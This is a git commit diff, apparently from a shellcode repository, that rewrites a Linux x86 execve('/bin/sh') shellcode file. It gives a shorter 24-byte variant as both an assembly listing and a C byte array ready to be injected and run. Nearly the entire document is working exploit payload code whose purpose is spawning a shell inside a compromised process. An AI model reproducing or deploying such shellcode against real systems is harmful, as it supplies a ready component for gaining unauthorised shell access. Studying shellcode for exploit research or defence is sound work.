b33f812b2e901bdf69568753f62847031323d4b2
Kawane <49018919+kawane21@users.noreply.github.com>
2019-04-02 10:30:48 +0900

    Update execve_bin_sh.c

--- linux_x86/execve_bin_sh.c
+++ linux_x86/execve_bin_sh.c
@@ -1,23 +1,23 @@
+
 /*
- * (linux/x86) /bin/sh shellcode --25 bytes--
+ * (linux/x86) /bin/sh shellcode --24 bytes--
 	_start:
-		xor	edx, edx
-		push	edx
+		xor	eax, eax
+		push	eax
 		push	0x68732f6e ;//bin/sh
 		push	0x69622f2f
 		mov	ebx, esp
-		push	edx
+		push	eax
 		push	ebx
 		mov	ecx, esp
-		push	0xb
-		pop   	eax
-		int   	0x80
+		mov	al,  0xb
+		int 	0x80
 
 */
 
 #include <stdio.h>
 
-char shellcode[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x6a\x0b\x58\xcd\x80";
+char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
 int main(void)
 {
